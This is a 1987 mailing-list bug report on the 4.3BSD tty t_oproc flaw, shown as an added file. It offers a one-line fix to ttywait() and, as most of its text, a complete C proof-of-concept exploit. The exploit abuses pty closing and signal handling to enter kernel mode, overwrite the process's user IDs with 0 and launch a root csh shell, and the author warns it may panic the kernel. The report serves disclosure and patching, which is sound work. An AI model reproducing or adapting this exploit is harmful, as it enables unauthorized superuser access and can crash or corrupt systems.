@@ -1,0 +1,146 @@
+From AMIR%TECHUNIX.BITNET@jade.berkeley.edu Thu Oct  1 21:29:32 1987
+Date: Thu, 1 Oct 87 22:36:37 +0200
+From: Amir Plivatsky <amir%techunix.bitnet@jade.berkeley.edu>
+Subject: A test program for the t_oproc bug
+Index: sys/tty.c 4.3BSD
+
+Hello,
+  Here is my test program for the t_oproc bug.  You can get a superuser
+with it on a Vax (at least), and maybe a panic (not tested) on other
+machines.  Its argument is a free pty name, (such as /dev/ptyqf).  If
+you run it (not from superuser!) it should print "after close", and
+then stuck.  Then, you interrupt it (^C).  As the response you will get
+a "UID 0" printout and the superuser prompt (and hopefully not a panic
+or a file system trash).
+
+  Note that "unpredictable" things may be done in the C startup routine
+for argv and envp after it is called from the kernel.  This may trash
+the Kernel.  So this test program may be changed not to use the C
+startup routine (maybe an entry point directly at main(), with a
+compiled pty name, and some other related changes).  Here this program
+seemed to cause no harm, but I rebooted (with fsck) after executing it,
+to be safe.
+
+  The program contains debugging statements and other redundant
+things.  It can be shortened but I didn't want to run it additional
+times for checking that the more elegant version indeed works.
+
+Fix:
+  In sys/tty.c, ttywait(), add a check for a non-null t_oproc before
+calling it:
+
+---
+        while ((tp->t_outq.c_cc || tp->t_state&TS_BUSY) &&
+            tp->t_state&TS_CARR_ON && tp->t_oproc) {
+---
+
+                                        Amir.
+
+-----------------------------------------------------------------------
+#include <sys/types.h>
+#include <vax/psl.h>
+#include <vax/machparam.h>
+#include <vax/vmparam.h>
+#include <sys/param.h>
+#include <sys/dir.h>
+#include <sys/user.h>
+#include <sys/ioctl.h>
+#include <sys/errno.h>
+
+#include <signal.h>
+#include <setjmp.h>
+
+jmp_buf jjp;
+int psl;
+int test;
+
+char *args[] = { "csh", "-f", 0, };
+char *env[] = { "PATH=:/bin/", "TERM=vi200", 0, };
+
+catch_sig() {
+        longjmp(jjp, 1);
+}
+
+main(ac, av)
+char **av;
+{
+        int m, s, a;
+        char buf[3000];
+
+        asm("   movpsl _psl");
+        if (!USERMODE(psl))
+                return (0);
+
+        signal(SIGINT, catch_sig);
+
+        if (ac != 2)
+                return (2);
+
+        if ((m = open(av[1], 2)) < 0) {
+                perror(av[1]);
+                return (3);
+        }
+        printf("%s opened\n", av[1]);
+        av[1][sizeof("/dev/")-1] = 't';
+        if ((s = open(av[1], 2)) < 0) {
+                perror(av[1]);
+                return (4);
+        }
+        printf("%s opened\n", av[1]);
+
+        /* LNOHANG seems to be redundant here */
+        if (ioctl(s, TIOCLSET, (char*)(a = LNOHANG|LMDMBUF, &a)) < 0) {
+                perror("TIOCLSET");
+                return(5);
+        }
+        if (ioctl(s, FIONBIO, (char*)(a = 1, &a)) < 0) {
+                perror("FIONBIO");
+                return(5);
+        }
+        bzero(buf, sizeof(buf));
+        if (write(s, buf, sizeof(buf)) < 0) {
+                extern int errno;
+
+                perror("write");
+                if (errno != EWOULDBLOCK) {
+                        /* avoid panic */
+                        ioctl(s, TIOCFLUSH, (char *)(a = 0, &a));
+                        return (5);
+                }
+        }
+        printf("after write\n");
+
+        read(m, " ", 1);
+        close(m);       /* !!! */
+        printf("after close(m)\n");
+        sleep(1);
+
+        if(setjmp(jjp) == 0)
+                close(s);       /* !!! */
+        else
+                ioctl(s, TIOCFLUSH, (char *)(a = 0, &a));
+
+        if (!test)
+                return(1);
+        printf("UID %d\n", getuid());
+        execve("/bin/csh", args, env);
+        perror("/bin/csh");
+        return (6);
+}
+
+exit(m) {
+        switch (m) {
+        case 1:
+                printf("Failed to gain kernel mode\n");
+                break;
+        case 0: /* !!! */
+                ((struct user *)USRSTACK)->u_uid = 0;
+                ((struct user *)USRSTACK)->u_ruid = 0;
+                test = 1;
+                return;
+        default:
+                printf("? exit(%d)\n", m);
+        }
+        _exit(m);
+}
+
